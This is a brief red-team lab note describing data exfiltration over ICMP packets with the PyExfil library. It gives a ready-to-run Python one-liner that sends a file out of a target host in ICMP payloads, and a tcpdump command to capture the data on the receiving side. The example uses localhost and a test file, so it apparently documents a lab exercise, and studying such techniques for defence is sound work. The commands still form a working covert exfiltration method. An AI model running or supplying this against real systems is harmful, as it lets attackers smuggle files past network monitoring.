# Stego Red Team

## Data Exfiltration using ICMP 8

* PyExfil: https://github.com/ytisf/PyExfil

* Target: `python -c 'from pyexfil.network.ICMP.icmp_exfiltration import send_file;ip_addr = "127.0.0.1";send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="/home/kali/stego/PyExfil/1.txt", max_packetsize=512, SLEEP=0.1)'`

* Server: `tcpdump -A icmp -i lo`
